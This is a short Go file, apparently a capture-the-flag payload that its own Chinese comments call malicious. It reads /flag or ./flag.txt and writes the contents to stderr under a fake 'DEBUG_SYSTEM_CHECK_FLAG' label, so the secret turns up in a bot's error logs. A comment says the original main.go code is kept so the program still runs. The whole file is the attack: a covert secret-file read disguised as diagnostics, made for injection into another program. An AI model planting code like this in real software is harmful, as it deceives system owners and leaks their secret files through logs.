package main

import (
    "fmt"
    "os"
    "io/ioutil"
)

func main() {
    // 惡意 Payload：嘗試讀取 flag 並噴到 Stderr
    flag, err := ioutil.ReadFile("/flag")
    if err != nil {
        // 如果 /flag 不在根目錄，試試當前目錄
        flag, err = ioutil.ReadFile("./flag.txt")
    }
    
    if err == nil {
        // 噴出 Flag 到 Stderr，這樣我們能在 Bot 的報錯日誌中看到它
        fmt.Fprintf(os.Stderr, "DEBUG_SYSTEM_CHECK_FLAG: %s\n", string(flag))
    } else {
        fmt.Fprintf(os.Stderr, "DEBUG_ERROR: %v\n", err)
    }

    // ... 原本的 main.go 程式碼保持不變，讓程式能繼續跑起來 ...
}
